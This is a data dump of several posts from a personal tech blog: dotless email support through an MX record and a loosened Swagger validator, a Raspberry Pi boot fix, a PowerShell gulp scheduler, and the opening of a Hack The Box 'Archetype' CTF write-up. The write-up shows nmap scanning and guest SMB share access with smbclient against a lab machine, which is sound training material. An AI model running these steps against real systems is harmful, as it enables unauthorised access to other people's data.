Zone Record to DNS\\n\\nAfter a few days of awaiting access to the DNS, I now needed to understand what record I needed to add to the DNS. The [ICANN link above](https://www.icann.org/en/announcements/details/new-gtld-dotless-domain-names-prohibited-30-8-2013-en) suggested that:\\n\\n> Dotless names would require the inclusion of, for example, an A, AAAA, or MX, record in the apex of a TLD zone in the DNS (i.e., the record relates to the TLD-string itself).\\n\\nI found out that the [A record indicates the IPv4 address](https://www.cloudflare.com/learning/dns/dns-records/dns-a-record/) of a domain and that the the [AAAA record was the same but for IPv6](https://il.godaddy.com/en/help/add-an-aaaa-record-19214). The relevant record seemed to be [MX as it directs emails to SMTP servers](https://www.cloudflare.com/learning/dns/dns-records/dns-mx-record/).\\n\\nNow that I knew that I needed to add an MX record, I found a [PowerShell cmdlet called `Add-DnsServerResourceRecordMX`](https://docs.microsoft.com/en-us/powershell/module/dnsserver/add-dnsserverresourcerecordmx?view=windowsserver2019-ps) which would allow me to do just that.\\n\\nAfter reading through the documentation and doing some trial and error on my test machine, I formulated the following command to successfully add the MX record:\\n\\n```powershell\\nAdd-DnsServerResourceRecordMX -Preference 1 -Name \u201c.\u201d -MailExchange \u201cGS-MEX001.domain.suffix\u201d -ZoneName \u201cdomain.suffix\u201d\\n```\\n\\nHere\'s an explanation of the cmdlet argments:\\n\\n- I set `-Preference` to `1` ensure that all SMTP requests sent from this Windows instance to mailservers will go through this `MX` record.\\n\\n- `-Name` specifies the name of the host for which this record will apply. In this case, we used `.` because we\'re going to be using the parent domain as the suffix instead of the TLD.\\n\\n- `-MailExchange` specifes the Fully Qualified Domain Name (FQDN) for the mail exchanger, e.g. the SMTP server address. Obviously the one used in the command above is made up.\\n\\n- `-ZoneName` specifies the DNS zone. DNS is split into different zones which allow administrators to have granular control of different DNS components such as certificates, authoritative nameservers and providers.\\n\\nAfter running this command on the production server, I saw that they were successfully added by running the following cmdlet:\\n\\n```powershell\\nGet-DnsServerSetting -All\\n```\\n\\nSo now, if someone sends an email to the address `@domain.suffix`, the sender email server will review and choose the `MX` record we created above and will direct the packet to it.\\n\\nOur work with nameservers is done! Next step is to look at some platform code!\\n\\n## Changing Swagger Validation\\n\\nReviewing our backend logic for the particular NodeJS microservice which handles all user authentication and management, I found out that when a user is able to successfully  log into the system using an SSO mechanism, the microservice generates an object for this user and saves in it in the database. As part of this user object generation, there is validation of the request body of the email property. This is why, when attempting to generate a user without a TLD on the platform, the API returns a `422 - Unprocessable Entity`:\\n\\n```bash\\ncurl -X POST \\"http://test/api/users\\" -H \\"Accept: application/json\\" -H \\"Content-Type: application/json\\" -d\\n{\\n   \\"first_name\\": \\"John\\",\\n   \\"last_name\\": \\"Doe\\",\\n   \\"email\\": \\"jdoe@domain\\"\\n}\\n```\\n\\n```json\\n{\\n   \\"error\\": {\\n        \\"message\\": \\"Request validation failed: Parameter (user) failed schema validation\\",\\n        \\"status\\": 422,\\n        \\"httpMessage\\": \\"Unprocessable Entity\\"\\n   }\\n}\\n```\\n\\nAfter further debugging, I was able to pinpoint where this user creation validation is enforced: in the [Swagger](https://swagger.io/) configuration:\\n\\n```yaml\\nuser:\\n  type: object\\n  properties:\\n    email:\\n      type: string\\n      pattern: >-\\n        ^(([^<>()[\\\\]\\\\\\\\.,;:\\\\s@\\"]+(\\\\.[^<>()[\\\\]\\\\\\\\.,;:\\\\s@\\"]+)*)|(\\".+\\"))@((\\\\[[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}\\\\])|(([a-zA-Z\\\\-0-9]+\\\\.)+[a-zA-Z]{2,}))$\\n\\n```\\n\\nRemoving this pattern-based validation and restarting the microservice, I was able to successfully generate a user!\\n\\n```bash\\ncurl -X POST \\"http://test/api/users\\" -H \\"Accept: application/json\\" -H \\"Content-Type: application/json\\" -d\\n{\\n   \\"firstName\\": \\"John\\",\\n   \\"lastName\\": \\"Doe\\",\\n   \\"email\\": \\"jdoe@domain\\"\\n}\\n```\\n\\n```json\\n{\\n   \\"email\\" : \\"jdoe@domain\\",\\n   \\"id\\" : \\"a1b2c3\\"\\n   \\"active\\": true,\\n   \\"created\\" : \\"2021-09-26T15:02:01.328Z\\",\\n   \\"lastUpdated\\": \\"2021-09-26T15:02:01.328Z\\",\\n   \\"firstName\\": \\"John\\",\\n   \\"lastName\\": \\"Doe\\",\\n   \\"username\\": \\"jdoe@domain\\"\\n}\\n```\\n\\nApplying the same changes in the customer\'s environment resolved their issue!\\n\\n**After note:** Please be mindful before making this change in a production environment. Removing the whole email validation in this case wasn\'t dangerous since we did it in an internal/dev environment to prove a point. A change such as the one described here can make your application API vulnerable to different attack vectors."},{"id":"fixing-ubuntu-hibernation","metadata":{"permalink":"/blog/fixing-ubuntu-hibernation","source":"@site/blog/fixing-ubuntu-hibernation.md","title":"Fixing Ubuntu Hibernation","description":"Introduction","date":"2025-02-07T09:07:28.000Z","tags":[{"inline":false,"label":"Ubuntu","permalink":"/blog/tags/ubuntu"},{"inline":false,"label":"Boot","permalink":"/blog/tags/boot"},{"inline":false,"label":"Hibernation","permalink":"/blog/tags/hibernation"},{"inline":false,"label":"Raspberry_pi","permalink":"/blog/tags/raspberry-pi"},{"inline":false,"label":"Swap","permalink":"/blog/tags/swap"},{"inline":false,"label":"Fs","permalink":"/blog/tags/fs"}],"readingTime":2.455,"hasTruncateMarker":true,"authors":[{"name":"Kobbi Gal","title":"I like to pick things apart and see how they work inside","url":"https://github.com/kbbgl","imageURL":"https://avatars.githubusercontent.com/u/14372649","key":"kbbgl","page":null}],"frontMatter":{"slug":"fixing-ubuntu-hibernation","title":"Fixing Ubuntu Hibernation","authors":["kbbgl"],"tags":["ubuntu","boot","hibernation","raspberry_pi","swap","fs"]},"unlisted":false,"prevItem":{"title":"How To Set Up Dotless Email Validation in Swagger","permalink":"/blog/dotless-email-regex-validation-swagger"},"nextItem":{"title":"How to Run a Sequential gulp.js Task using\xa0PowerShell","permalink":"/blog/gulpjs-task-using-powershell"}},"content":"## Introduction\\n\\nOne day, seemingly out of the blue, my (using [Docusaurus](https://docusaurus.io/) blog site, which is set up as an Ubuntu `systemd` service on the Raspberry Pi 4, stopped being accessible.\\n\\n\x3c!-- truncate --\x3e\\n\\nI tried pinging it and checking whether is it was connected to my local network but it was nowhere to be found. This meant that I needed to physically access the Raspberry Pi so I connected it to a monitor and reset it.\\n\\n## Boot No Good\\n\\nUpon reboot, I was greeted by a console with the following worrying \\"Kernel panic\\" message:\\n\\n```\\n/init: conf/conf.d/zz-resume-auto: line 1: syntax error: unexpected \\"{\\" \\n[ 1.344964] Kernel panic - not syncing: Attempted to kill mitt exitcode=0x00000200 \\n[ 1.352769] CPU: 0 PID: 1 Comm: init Not tainted 5.19.0-1011-raspi #18-Ubuntu\\n[ 1.360029] Hardware name: Raspberry Pi 4 Model B Rev 1.4 (DT)\\n[ 1.365959] Call trace:\\n[ 1.368442]  dump_backtrace+Oxbc/Ox124\\n[ 1.372260]  show_stackoN20/0x5c\\n[ 1.375625]  dump stack_lul4x88/Oxb4\\n[ 1.379349]  dump stack4x18/004\\n[ 1.382714]  panic\u2022Ox1b4/00ac\\n[ 1.385816]  do exit\u2022ex518/0x520\\n[ 1.389095]  do_group_exit4x3c/OxbO\\n[ 1.392726]  __Nake_gp_parent+Ox0/0x40\\n[ 1.396534]  inuoke_syscall4x50/0x120\\n[ 1.400343]  el6_suc_common.constprop.04.0x6c/Ox1a0\\n[ 1.405211]  do ele_suc+004/0x44\\n[ 1.400577]  elesuc+040/0x180\\n[ 1.411768]  elOt_64_sync_handler+Oxf4/0x120\\n[ 1.416106]  elOt_64_sync+Ox1a0/0x1A4\\n[ 1.419026] SNP: stopping secondary CPUs\\n[ 1.423813] Kernel Offset: Ox4b0c05400000 from Oxffff800008000000\\n[ 1.430004] PHYS_OFFSET: Oxffffd932c0000000 \\n[ 1.434250] CPU features: Ox2000,04027810,00001086\\n[ 1.439117] Memory Limit: none\\n[ 1.442221] ---[ end Kernel panic - not syncing: Attempted to kill init! exitcode=0x00000200 ]--- \\n```\\n\\nThe first line was the one that stood out. Seems that the file `zz-resume-auto` has a problem with the curly brackets within that context. At this time, I had to figure out a couple of things:\\n\\n1. What is this file `zz-resume-auto`?\\n1. Who writes to this file?\\n\\n### Who are you `zz-resume-auto`?\\n\\nSince I couldn\'t access the Raspberry Pi remotely, I had to somehow be able to access it\'s filesystem without it booting. Since the Raspberry Pi\'s storage comes in a form of an SD card, I could just pull out the SD card from the slot on the Raspberry Pi, mount it onto an adapter and connect it to another computer.\\n\\nAfter inserting the SD card adapter to one of the USB slots on my other machine, I ran the following command to create a directory for the Raspberry Pi filesystem and mounted the SD card onto it:\\n\\n```bash\\n# find the disk\\n> fdisk -l\\n\\nDisk /dev/sda: 59.48 GiB, 63864569856 bytes, 124735488 sectors\\nDisk model: Card  Reader\\nUnits: sectors of 1 * 512 = 512 bytes\\nSector size (logical/physical): 512 bytes / 512 bytes\\nI/O size (minimum/optimal): 512 bytes / 512 bytes\\nDisklabel type: dos\\nDisk identifier: 0x44eba349\\n\\nDevice     Boot  Start       End   Sectors  Size Id Type\\n/dev/sda1  *      2048    526335    524288  256M  c W95 FAT32 (LBA)\\n/dev/sda2       526336 124735454 124209119 59.2G 83 Linux\\n\\n\\n> mkdir /media/rpi/\\n\\n> mount /dev/sda1/ /media/rpi\\n\\n> ls /media/rpi\\nbin   dev  home  lost+found  mnt  proc  run   snap  sys  usr\\nboot  etc  lib   media       opt  root  sbin  srv   tmp  var\\n```"},{"id":"gulpjs-task-using-powershell","metadata":{"permalink":"/blog/gulpjs-task-using-powershell","source":"@site/blog/gulpjs-task-using-powershell.md","title":"How to Run a Sequential gulp.js Task using\xa0PowerShell","description":"Fill me up!","date":"2025-02-07T09:07:28.000Z","tags":[{"inline":false,"label":"Gulp","permalink":"/blog/tags/gulp"},{"inline":false,"label":"Gulp.js","permalink":"/blog/tags/gulp-js"},{"inline":false,"label":"Gulpjs","permalink":"/blog/tags/gulpjs"},{"inline":false,"label":"Script","permalink":"/blog/tags/script"},{"inline":false,"label":"Scripting","permalink":"/blog/tags/scripting"},{"inline":false,"label":"Task_scheduler","permalink":"/blog/tags/task-scheduler"},{"inline":false,"label":"Windows","permalink":"/blog/tags/windows"}],"readingTime":6.83,"hasTruncateMarker":true,"authors":[{"name":"Kobbi Gal","title":"I like to pick things apart and see how they work inside","url":"https://github.com/kbbgl","imageURL":"https://avatars.githubusercontent.com/u/14372649","key":"kbbgl","page":null}],"frontMatter":{"slug":"gulpjs-task-using-powershell","title":"How to Run a Sequential gulp.js Task using\xa0PowerShell","description":"Fill me up!","authors":["kbbgl"],"tags":["gulp","gulp.js","gulpjs","script","scripting","task_scheduler","windows"]},"unlisted":false,"prevItem":{"title":"Fixing Ubuntu Hibernation","permalink":"/blog/fixing-ubuntu-hibernation"},"nextItem":{"title":"Hack The Box \u2018Archetype\u2019 Challenge","permalink":"/blog/hack-the-box-archetype-challenge"}},"content":"## Introduction\\n\\nOne of our largest and strategic customer recently requested to be able to execute an automated ETL pipeline from one of their Windows multinode cluster in a sequential manner.\\n\\n\x3c!-- truncate --\x3e\\n\\nThe ETL pipeline has basically 3-stages:\\n\\n1. Initialize an import from their many data sources into a consolidated database on master node.\\n2. After the import step finishes, copy the flat files representing the consolidated database to the slave nodes.\\n3. After the copying step is completed, delete the old instance of the database from the slave nodes and launch the newly-copied database.\\n\\nThe customer\u2019s request rose out of a necessity because there was no way to perform this process in a sequential manner out-of-the-box as the product only by offered using scheduled manner. Since the Windows version of this feature was deprecated and no longer maintained, it was left up to Support to provide a crafty solution to this problem as R&D and Product were not willing to put in hours to add this feature.\\n\\n## Starting Point\\n\\nAlthough the product did not supply a way to perform the sequential task out-of-the-box, I did have a pretty solid ground to begin with.\\nOn the master node, where the ETL process needs to initilize from, there were a few Windows Services running which allowed the non-sequential, scheduled build and copy operation to be done.\\nThe first service was a management service written in .NET/C# that managed the consolidated database instances and exposed a CLI to be able to interact with them. Using this CLI, we\u2019re able to start initialize the ETL process and refresh the remote databases after copying the flat files to the slave nodes.\\nThe second service was a NodeJS application which wrapped a [`gulp.js`](https://gulpjs.com/) task initializer. The tasks were responsible for interacting with the first service using the CLI to perform the following operations:\\n\\n1. Initialize the ETL process.\\n2. After the ETL process finishes on the master node, synchronously copy the database flat files from the master node to the slave nodes.\\n3. Send a command to the slave nodes to restart the database instance with the copied flat files.\\n\\nThe way product worked out-of-the-box is to read a configuration file which includes:\\n\\na. The cron pattern to initialize the `gulp` task represented by scheduler.schedule, `15 20 1 * *`.\\nb. The slave nodes\u2019 remote copy location. This is where the flat files copied from the master node will be copied into the slave nodes. Represented by `dbN.slave_path`.\\nc. The name of the database for which to initialize the ETL process on the master node. Represented by `tasks.some_db_task.build.db`.\\nThe configuration file (very redacted) looks something like this:\\n\\n```json\\n{\\n  \\"db1\\": {\\n      \\"db_name\\": \\"SomeDB\\",\\n      \\"slave_path\\": \\"\\\\\\\\\\\\\\\\slave_node_1_hostname\\\\\\\\C:\\\\\\\\path\\\\\\\\to\\\\\\\\SomeDB\\\\\\\\FlatFiles\\"\\n    },\\n    \\"db1\\": {\\n      \\"db_name\\": \\"SomeDB\\",\\n      \\"slave_path\\": \\"\\\\\\\\\\\\\\\\slave_node_2_hostname\\\\\\\\C:\\\\\\\\path\\\\\\\\to\\\\\\\\SomeDB\\\\\\\\FlatFiles\\"\\n    },\\n    \\"scheduler\\":[  \\n      {  \\n         \\"task\\":\\"some_db_task\\",\\n         \\"schedule\\":\\"15 20 1 * *\\",\\n         \\"enabled\\": true\\n      }\\n   ],\\n   \\"tasks\\":{  \\n      \\"some_db_task\\":[  \\n         {  \\n            \\"build\\":{  \\n               \\"db\\":[  \\n                  \\"SomeDB\\"\\n                  ]\\n            }\\n         },\\n         {  \\n            \\"distribute\\":[  \\n               \\"db1.slave_path\\",\\n               \\"db2.slave_path\\"\\n               ]\\n         }\\n      ]\\n   }\\n}\\n```\\n\\nI figured, if I could find a way to launch the `gulp` task independently, in the example above `some_db_task`, and develop some logic to initialize it sequentially, I would be able to supply a solution to the customer.\\nThe first step was to understand how `gulp` tasks worked.\\n\\n## `gulp` Research\\n\\nAfter reviewing the source code of the NodeJS service which initializes the `gulp` tasks, I found that there are a few ways to run them:\\n\\n- We can run the task using\\n\\n    ```bash\\n    node.exe /path/to/gulp.js\\n    ```\\n\\n- We can specify the task name according to what\u2019s configured:\\n\\n    ```bash\\n    node.exe /path/to/gulp.js some_db_task\\n    ```\\n\\n- Run it using `gulp`:\\n\\n    ```bash\\n    gulp some_db_task\\n    ```\\n\\nUnfortunately, option 3 was too cumbersome as it required installing NPM/NodeJS on the master node since the product does not install it by default (it just uses the `node.exe` binary). And since the customer requested a specific DB to run this pipeline on, I decided to discard option 1 and develop a script to run option 2.\\n\\nAs I began testing the procedure, I noticed that the gulp tasks created a forked process by which they would interact with the .NET management service. The problem was, once the command to initialize the ETL process finished executing, the process would hang and would not complete the remote copying operations. I needed to figure out what was causing this hang so I opened my IDE to review the source code behind gulp.\\nWhat I found was that after the gulp task stopped its execution, it did not gracefully terminate the process. It can be seen here:\\n\\n```javascript\\ngulpInst.on(\'task_stop\', function(e) {\\n    var time = prettyTime(e.hrDuration);\\n    gutil.log(\\n        \'Finished\', \'\\\\\'\' + chalk.cyan(e.task) + \'\\\\\'\',\\n        \'after\', chalk.magenta(time)\\n    );\\n});\\n```\\n\\nI added the following line to ensure that the process exited when the task stopped:\\n\\n```javascript\\ngulpInst.on(\'task_stop\', function(e) {\\n    var time = prettyTime(e.hrDuration);\\n    gutil.log(\\n        \'Finished\', \'\\\\\'\' + chalk.cyan(e.task) + \'\\\\\'\',\\n        \'after\', chalk.magenta(time)\\n    );\\n    process.exit(0); // <-------- SHOULD BE HERE!\\n});\\n```\\n\\nAfter updating the source code, the hanging processes issue was resolved!\\nNext step was to write a script to run the sequential build.\\n\\n## `gulp` Powered by PowerShell\\n\\nMy scripting language of choice is bash but since I was working on a Windows environment, without an ability to install 3rd-party tools such as `cygwin` and no access to Python either, I defaulted to PowerShell. The script name is `gulpTaskSequentialWithWait.ps1`:\\n\\n```powershell\\n#  -------------------\\n#  -------------------\\n#  User configuration \\n \\n# Configurate number of minutes to wait before each ETL\\n$waitTimeBetweenBuildsInMinutes = 1\\n \\n# The gulp task name\\n$taskName = \\"some_db_task\\"\\n \\n# log location -default writes to directory where ps script was launched from\\n$currentLocation = $PSScriptRoot\\n$logLocation = Join-Path -Path $currentLocation -ChildPath \\"gulpTaskSequential.log\\"\\nWrite-Host \\"Writing logs to \'$logLocation\'\\"\\n \\n#  -------------------\\n#  -------------------\\n \\n \\n$workingDir = \\"C:\\\\path\\\\to\\\\dir\\"\\n$env:NODE_ENV = \'production\'\\n$gulpFile = \\"./node_modules/gulp/bin/gulp.js\\"\\n$nodeJsExecutableFilePath = \\"node.exe\\"\\n \\n \\n# Start gulp task infintely\\ndo {\\n \\n     \\n    # Create a new process\\n    $pinfo = New-Object System.Diagnostics.ProcessStartInfo\\n \\n    # Set working dir to Orchestrator folder\\n    $pinfo.WorkingDirectory = $workingDir\\n \\n    Write-Host \\"Changed working dir:\\" $pinfo.WorkingDirectory\\n \\n    # Initialize process arguments and output redirection\\n    $pinfo.FileName = Join-Path -Path $workingDir -ChildPath $nodeJsExecutableFilePath\\n    $pinfo.RedirectStandardError = $true\\n    $pinfo.RedirectStandardOutput = $true\\n    $pinfo.UseShellExecute = $false\\n    $pinfo.CreateNoWindow = $true\\n    $pinfo.Arguments = @($gulpFile, $taskName)\\n     \\n    $p = New-Object System.Diagnostics.Process\\n    $p.StartInfo = $pinfo\\n    $p.Start() | Out-Null\\n     \\n    Write-Host (Get-Date -Format U) \\"Starting task \'$nodeJsExecutableFilePath $gulpFile $taskName\'...\\"\\n    (Get-Date -Format U) + \\"Starting task \'$nodeJsExecutableFilePath $gulpFile $taskName\'...\\" | Out-File -FilePath $logLocation -Append\\n \\n    $stdout = $p.StandardOutput.ReadToEnd()\\n    $stderr = $p.StandardError.ReadToEnd()\\n    $p.WaitForExit()\\n \\n    # Terminate process if non-zero exit code returned from command\\n    if ($p.ExitCode -ne 0){\\n \\n        (Get-Date -Format U) +  \\" exit code: \\" + $p.ExitCode | Out-File -FilePath $logLocation -Append\\n        Write-Host (Get-Date -Format U) \\"exit code: \\" $p.ExitCode\\n \\n        (Get-Date -Format U) +  \\" stderr: $stderr\\" | Out-File -FilePath $logLocation -Append\\n        Write-Host (Get-Date -Format U) \\"stderr: $stderr\\"\\n \\n        (Get-Date -Format U) + \\"Exiting..\\" | Out-File -FilePath $logLocation -Append\\n        Write-Host (Get-Date -Format U) \\"Exiting..\\"\\n        exit\\n    } else {\\n \\n        (Get-Date -Format U) + \\" stdout: $stdout\\" | Out-File -FilePath $logLocation -Append\\n        Write-Host (Get-Date -Format U) \\"stdout: $stdout\\"\\n \\n        $sleepTimeInSeconds = $waitTimeBetweenBuildsInMinutes * 60\\n \\n        Write-Host (Get-Date -Format U) \\" Starting sleep timer: $sleepTimeInSeconds seconds...\\"\\n        (Get-Date -Format U) + \\" Starting sleep timer: $sleepTimeInSeconds seconds...\\" | Out-File -FilePath $logLocation -Append\\n \\n \\n        Start-Sleep -Seconds $sleepTimeInSeconds\\n \\n \\n        Write-Host (Get-Date -Format U) \\"Sleep ended\\"\\n        (Get-Date -Format U) + \\" Sleep ended\\" | Out-File -FilePath $logLocation -Append\\n \\n    }\\n} while ($True) \\n```\\n\\nThe script basically runs an infinite loop with a configurable timeout (line 6, variable `waitTimeBetweenBuildsInMinutes`) executing the `gulp` task. We can also configure the name of the task in line 9, variable `taskName`.\\nI needed to ensure that the PowerShell script would be initialized after a reboot so I wrote a Task Scheduler XML to automatically start the script upon server boot:\\n\\n```markup\\n<?xml version=\\"1.0\\" encoding=\\"UTF-16\\"?>\\n<Task version=\\"1.2\\" xmlns=\\"http://schemas.microsoft.com/windows/2004/02/mit/task\\">\\n  <RegistrationInfo>\\n    <Date>2020-01-01T00:00:00.0000000</Date>\\n    <Author>SOME_DOMAIN\\\\YOUR_USER</Author>                    \x3c!--Change author--\x3e\\n  </RegistrationInfo>\\n  <Triggers>\\n    <BootTrigger>\\n      <ExecutionTimeLimit>PT12H</ExecutionTimeLimit>\\n      <Enabled>true</Enabled>\\n    </BootTrigger>\\n  </Triggers>\\n  <Principals>\\n    <Principal id=\\"Author\\">\\n      <UserId>SOME_DOMAIN\\\\YOUR_USER</UserId>                  \x3c!--Change author--\x3e\\n      <LogonType>Password</LogonType>\\n      <RunLevel>HighestAvailable</RunLevel>\\n    </Principal>\\n  </Principals>\\n  <Settings>\\n    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\\n    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>\\n    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>\\n    <AllowHardTerminate>true</AllowHardTerminate>\\n    <StartWhenAvailable>false</StartWhenAvailable>\\n    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\\n    <IdleSettings>\\n      <StopOnIdleEnd>true</StopOnIdleEnd>\\n      <RestartOnIdle>false</RestartOnIdle>\\n    </IdleSettings>\\n    <AllowStartOnDemand>true</AllowStartOnDemand>\\n    <Enabled>true</Enabled>\\n    <Hidden>false</Hidden>\\n    <RunOnlyIfIdle>false</RunOnlyIfIdle>\\n    <WakeToRun>false</WakeToRun>\\n    <ExecutionTimeLimit>P1D</ExecutionTimeLimit>\\n    <Priority>7</Priority>\\n  </Settings>\\n  <Actions Context=\\"Author\\">\\n    <Exec>\\n      <Command>powershell.exe</Command>\\n      <Arguments>-ExecutionPolicy Bypass \\"C:\\\\path\\\\to\\\\gulpTaskSequentialWithWait.ps1\\"</Arguments> \x3c!--Change script location--\x3e\\n    </Exec>\\n  </Actions>\\n</Task>\\n```\\n\\nThe Task runs the following commands:\\n\\n```powershell\\npowershell.exe -ExecutionPolicy Bypass gulpTaskSequentialWithWait.ps1\\n```\\n\\nAnd ensures that the Task is run on boot:\\n\\n```markup\\n<Triggers>\\n    <BootTrigger>\\n      <ExecutionTimeLimit>PT12H</ExecutionTimeLimit>\\n      <Enabled>true</Enabled>\\n    </BootTrigger>\\n  </Triggers>\\n```\\n\\nAnother happy customer!"},{"id":"hack-the-box-archetype-challenge","metadata":{"permalink":"/blog/hack-the-box-archetype-challenge","source":"@site/blog/hack-the-box-archetype-challenge.md","title":"Hack The Box \u2018Archetype\u2019 Challenge","description":"Fill me up!","date":"2025-02-07T09:07:28.000Z","tags":[{"inline":false,"label":"Capture_the_flag","permalink":"/blog/tags/capture-the-flag"},{"inline":false,"label":"Ctf","permalink":"/blog/tags/ctf"},{"inline":false,"label":"Cybersecurity","permalink":"/blog/tags/cybersecurity"},{"inline":false,"label":"Hacking","permalink":"/blog/tags/hacking"},{"inline":false,"label":"Smb","permalink":"/blog/tags/smb"},{"inline":false,"label":"Windows","permalink":"/blog/tags/windows"}],"readingTime":14.365,"hasTruncateMarker":true,"authors":[{"name":"Kobbi Gal","title":"I like to pick things apart and see how they work inside","url":"https://github.com/kbbgl","imageURL":"https://avatars.githubusercontent.com/u/14372649","key":"kbbgl","page":null}],"frontMatter":{"slug":"hack-the-box-archetype-challenge","title":"Hack The Box \u2018Archetype\u2019 Challenge","description":"Fill me up!","authors":["kbbgl"],"tags":["capture_the_flag","ctf","cybersecurity","hacking","smb","windows"]},"unlisted":false,"prevItem":{"title":"How to Run a Sequential gulp.js Task using\xa0PowerShell","permalink":"/blog/gulpjs-task-using-powershell"},"nextItem":{"title":"How To Trace/Read RabbitMQ\xa0Messages","permalink":"/blog/how-to-trace-read-rabbitmq-messages"}},"content":"## What is Hack The Box?\\n\\n[Hack The Box](https://www.hackthebox.eu/) is a website offering vulnerable machines for practising hacking skills. The goal of the \u2018Labs\u2019 are to hack into the system and capture the flag (CTF) which can be found in a text file in the desktop of a regular and an administrator user.\\nOn my pursuit to get some practical exercise in the field, I decided to sign up and attempt one of the beginner exercises. This post describes how I managed to get remote code execution (RCE) in the one of the boxes and access the flags.\\n\\n\x3c!-- truncate --\x3e\\n\\n## Connecting to Hack The Box Network\\n\\nThe first step is to connect to the Hack The Box network to be able to enumerate the target machine. To do this, we need to download an OpenVPN configuration file (`.ovpn`) and use the `openvpn` utility to create the tunnel into the Hack The Box network:\\n\\n```bash\\nsudo openvpn /path/to/hack_the_box.ovpn\\n \\nAttempting to establish TCP connection with [AF_INET]1.222.333.222:443 [nonblock]\\nTCP connection established with [AF_INET]1.222.333.222:443\\n```\\n\\n## Enumeration\\n\\nTo enumerate a target machine (IP `10.12.12.27`) is to list all possible ways we can use to hack into it. The best place to start is to scan the machine for open ports and try to detect the operating system so we can tailor our methods. To perform the scan, I used the standard way, [`nmap`, the network mapper](https://nmap.org/).\\nI executed the scan as follows as I found it gives a pretty verbose output and the scan is quite fast as well:\\n\\n```bash\\nip=\\"10.12.12.27\\"\\nnmap -T4 -A $ip -oN nmap_scan.txt\\n```\\n\\nThe `-A` flag is to used to detect the operating system and version and `traceroute`.\\nThe `-T4` flag is there to ensure that the scan is fast. The range is between `0-5` where the higher the number, the faster it scans.\\nThe `-oN` flag tells the tool to save the scan to a file, in this case `nmap_scan.txt` in the same directory.\\nReviewing the scan output, we see that that the machine is a 2019 Windows Server  and has a SQL Server 2017 instance listening on port 1433:\\n\\n```bash\\ncat nmap_scan.txt\\n \\n...\\nPORT     STATE SERVICE      VERSION                                                                                                    \\n135/tcp  open  msrpc        Microsoft Windows RPC                                                                                      \\n139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn                                                                              \\n445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds                                                            \\n1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM\\n... \\n```\\n\\nIf we scroll down a bit more, we can see that the target machine discovery was done using the [SMB (Server Message Block)](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831795(v=ws.11)) running on port 445 which is a protocol for shared files and folders in a network:\\n\\n```bash\\ncat nmap_scan.txt\\n \\n...\\nHost script results:                                               \\n...                       \\n| smb-security-mode:                                               \\n|   account_used: guest                                            \\n|   authentication_level: user                                     \\n|   challenge_response: supported                                  \\n|_  message_signing: disabled (dangerous, but default)\\n```\\n\\nThis is the protocol that allows us to access remote shared network drives from Windows Explorer by inserting `\\\\\\\\REMOTE_IP\\\\SHARE_NAME` in the address bar. SMB is known to have many vulnerabilities (e.g. [EternalBlue](https://en.wikipedia.org/wiki/EternalBlue), [ADV200005](https://msrc.microsoft.com/update-guide/vulnerability/ADV200005)) so my intuition guided me to use this protocol to gain more information about the system. Also, we can see pretty clearly that the guest user is enabled which inherently means that there\u2019s no need for a password!\\n\\n## Getting Credentials using `smbclient`\\n\\nNow that we know that the SMB server is up, we need to find a way to connect and enumerate it. I found this [UNIX StackExchange post](https://unix.stackexchange.com/questions/65106/accessing-a-smb-share-without-a-password) helpful as it mentioned that we can connect to the SMB server using a client called smbclient and it provided the arguments needed to connect without a password.\\nI found that I already had `smbclient` installed:\\n\\n```bash\\nwhich smbclient\\n/usr/bin/smbclient\\n```\\n\\nI attempted to connect to the SMB server using the following command:\\n\\n```bash\\nsmbclient //$ip// -U \\" \\"%\\" \\"\\n```\\n\\nBut I saw no output. It could be a positive since it means that I reached the server and no connection errors were thrown. But it seems that I was missing something to get it to display its contents.\\nI turned to reading the smbclient manual and found that there\u2019s a way to list the server contents:\\n\\n```bash\\nman smbclient\\n...\\n-L|--list                                                                                                                       \\n           This option allows you to look at what services are available on a server. You use it as smbclient -L host and a list should appear.\\n...\\n```\\n\\nSounds promising. When I ran it, I got the following output:\\n\\n```bash\\nsmbclient -L //$ip// -U \\" \\"%\\" \\"\\n                                                                                                                                       \\n        Sharename       Type      Comment                                                                                              \\n        ---------       ----      -------                                                                                              \\n        ADMIN$          Disk      Remote Admin                                                                                         \\n        backups         Disk                                                                                                           \\n        C$              Disk      Default share                                                                                        \\n        IPC$            IPC       Remote IPC                                                                                           \\nSMB1 disabled -- no workgroup available\\n```\\n\\nSo we can see that we have 4 shared drives here, 3 of them are disks and one of them is used for [Inter Process Communications (IPC)](https://en.wikipedia.org/wiki/Inter-process_communication). The IPC enables users to enumerate network shares and is created by default by the system ([source](https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/inter-process-communication-share-null-session)). So I needed to focus on trying to access the disk shares as the IPC is the share that allows us to perform the enumeration in the first place. The $ suffix in the share name indicates it\u2019s the share is hidden.\\nTo access the share, I removed the `-L` flag and ran the following command to attempt to access the `ADMIN` share:\\n\\n```bash\\nsmbclient //$ip//ADMIN$ -U \\" \\"%\\" \\"\\ntree connect failed: NT_STATUS_ACCESS_DENIED\\n```\\n\\nSame for the `C$` share (which is the `C` drive):\\n\\n```bash\\nsmbclient //$ip//C$ -U \\" \\"%\\" \\"\\ntree connect failed: NT_STATUS_ACCESS_DENIED\\n```\\n\\nThis indicates that the guest user doesn\u2019t have access to these shares. But, we attempting to access the backups share, we were introduced with a shell!\\n\\n```bash\\nsmbclient //$ip\\\\\\\\backups -U \\" \\"%\\" \\"                                                                                             \\nTry \\"help\\" to get a list of possible commands.                                                                                         \\nsmb: \\\\>  \\n```\\n\\nI typed \u2018help\u2019 in the command prompt and found that the majority of the commands were pretty standard shell commands. For instance, I wanted to list the contents of the folder:\\n\\n```bash\\nsmb: \\\\> dir\\n  .                                   D        0  Mon Jan 20 14:20:57 2020                                                             \\n  ..                                  D        0  Mon Jan 20 14:20:57 2020                                                             \\n  prod.dtsConfig                     AR      609  Mon Jan 20 14:23:02 2020                                                             \\n                                                                                                                                        \\n                10328063 blocks of size 